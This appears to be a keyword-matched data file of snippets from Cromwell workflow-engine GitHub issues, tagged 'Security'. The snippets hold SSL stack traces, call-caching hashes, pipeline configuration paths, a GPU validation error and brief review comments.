Security,8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClient,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8359,secur,security,8359,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,8764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCach,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:3320,hash,hashes,3320,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"8bc10677|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R1Fastq|""62396",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:5431,hash,hashes,5431,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"8bc10677|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:F",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:5179,hash,hashes,5179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,8bc10677|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:docker|A528,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:2739,hash,hashes,2739,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,9];   at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19];   at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19];   at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19];   at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19];   at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19];   at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$.withRetry(GcsFileSystemProvider.scala:44) ~[cromwell.jar:0.19];   at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider.crc32cHash(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19];   at cromwell.engine.backend.io.package$PathEnhanced$.hash$extension(package.scala:32) ~[cromwell.jar:0.19];   at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:65) ~[cromwell.jar:0.19];   at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:63) ~[cromwell.jar:0.19];   at wdl4s.values.WdlValue$class.computeHash(WdlValue.scala:63) ~[cromwell.jar:0.19];   at wdl4s.values.WdlSingleFile.computeHash(WdlFile.scala:39) ~[cromwell.jar:0.19];   at cromwell.engine.backend.WorkflowDescriptor.hash(WorkflowDescriptor.scala:229) ~[cromwell.jar:0.19];   at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:627) ~[cromwell.jar:0.19];   at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:626) ~[cromwell.jar:0.19];   at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19];   at scala.collection.MapLike$MappedValues$$anonf,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/810:2568,hash,hash,2568,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/810,1,['hash'],['hash']
Security,9];   at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19];   at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19];   at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19];   at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19];   at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19];   at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$.withRetry(GcsFileSystemProvider.scala:44) ~[cromwell.jar:0.19];   at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider.crc32cHash(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19];   at cromwell.engine.backend.io.package$PathEnhanced$.hash$extension(package.scala:32) ~[cromwell.jar:0.19];   at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:65) ~[cromwell.jar:0.19];   at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:63) ~[cromwell.jar:0.19];   at wdl4s.values.WdlValue$class.computeHash(WdlValue.scala:63) ~[cromwell.jar:0.19];   at wdl4s.values.WdlSingleFile.computeHash(WdlFile.scala:39) ~[cromwell.jar:0.19];   at wdl4s.values.WdlValue$$anonfun$computeHash$3.apply(WdlValue.scala:62) ~[cromwell.jar:0.19];   at wdl4s.values.WdlValue$$anonfun$computeHash$3.apply(WdlValue.scala:62) ~[cromwell.jar:0.19];   at scala.collection.immutable.Stream$$anonfun$map$1.apply(Stream.scala:418) ~[cromwell.jar:0.19];   at scala.collection.immutable.Stream$$anonfun$map$1.apply(Stream.scala:418) ~[cromwell.jar:0.19];   at scala.collection.immutable.Stream$Cons.tail(Stream.scala:1233) ~[cromwell.jar:0.19];   at scala.collection.immutable.Stream$Cons.tail(,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/826:3337,hash,hash,3337,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/826,1,['hash'],['hash']
Security,9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; name: mutectMergedRawVCF-0; - localCopy:; disk: local-disk; path: firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; name: VEP_File-0; - localCopy:; disk: local-disk; path: exec.sh; name: exec; name: CallingGroup_Workflow; outputParameters:; - localCopy:; disk: local-disk; path: VEP_Task-rc.txt; name: VEP_Task-rc.txt; - localCopy:; disk: local-disk; path: dstat.log.txt; name: dstat.log.txt; - localCopy:; disk: local-disk; path: df.log.txt; name: df.log.txt; - localCopy:; disk: local-disk; path: variant_effect_output.txt; name: variant_effect_output.txt; - localCopy:; disk: local-disk; path: variant_effect_output.txt_summary.html; name: variant_effect_output.txt_summary.html; projectId: broad-firecloud-benchmark; resources:; bootDiskSizeGb: 10; disks:; - mountPoint: /cromwell_root; name: local-disk; sizeGb: 31; type: PERSISTENT_HDD; minimumCpuCores: 1; minimumRamGb: 7; zones:; - us-central1-b; - us-central1-c; - us-central1-f; pipelineArgs:; clientId: ''; inputs:; VEP_File-0: gs://firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; __extra_config_gcs_path: gs://cromwell-auth-broad-firecloud-benchmark/04b3f189-18f3-47b3-972c-0e59d2a56174_auth.json; exec: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/exec.sh; mutectMergedRawVCF-0: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; labels: {}; logging:; gcsPath: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/VEP_Task.log; outputs:; VEP_Task-rc.txt: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a8888400,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145:3763,access,access,3763,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145,1,['access'],['access']
Security,": ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the workflow store.; ERROR: Status of job is not Submitted, Running, or Succeeded: Failed; ```. If ran with `gpu_count >= 1` workflow run successfully. . Desired behaviour : `gpu_count = 0` runs to completion, without being assigned a gpu from the backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:1618,validat,validation,1618,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757,3,"['Validat', 'validat']","['ValidatedRuntimeAttributesBuilder', 'validation']"
Security,: General OpenSslEngine problem; at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine.handshakeException(ReferenceCountedOpenSslEngine.java:1907); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine.wrap(ReferenceCountedOpenSslEngine.java:834); at java.base/javax.net.ssl.SSLEngine.wrap(SSLEngine.java:564); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.wrap(SslHandler.java:1041); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.wrapNonAppData(SslHandler.java:927); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1409); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.unwrapNonAppData(SslHandler.java:1327); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.access$1800(SslHandler.java:169); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner.resumeOnEventExecutor(SslHandler.java:1718); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner.access$2000(SslHandler.java:1609); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner$2.run(SslHandler.java:1770); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:174); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:167); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470); at io.grpc.netty.shaded.io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:403); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997); at io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74); at io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30); ... 1 common frames omitted; Caused by: sun.security.validator.ValidatorException: PKIX path building fai,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:5914,access,access,5914,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['access'],['access']
Security,":+1: . So sad, i'm always seeking validation :'(. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1427/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1427#issuecomment-247640697:34,validat,validation,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1427#issuecomment-247640697,1,['validat'],['validation']
Security,":+1: minding Chris comment that ""not a real value"" as an encryption key might break cromwell. So either wait for devops to put the real key before merging or change it to some dummy `""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=""`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/377#issuecomment-171465923:57,encrypt,encryption,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/377#issuecomment-171465923,1,['encrypt'],['encryption']
Security,":+1: these were removed for non-technical reasons which are no longer an issue. Note to implementer (here and #2651) - keep in mind that we very intentionally don't process workflows (including validation) synchronously for submission so we should be careful here as well. One thought would be to put this (and the inputs functionality in #2651) in something behind the service registry. The default impl could process the request the way one would expect, but in something like CaaS the requests could be farmed out to another microservice or something like that. . Either way, we're also doing validation in MWDA, we should make sure it's being done the same as here",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2652#issuecomment-331680557:194,validat,validation,194,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2652#issuecomment-331680557,2,['validat'],['validation']
Security,":1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketI",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:7463,secur,security,7463,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
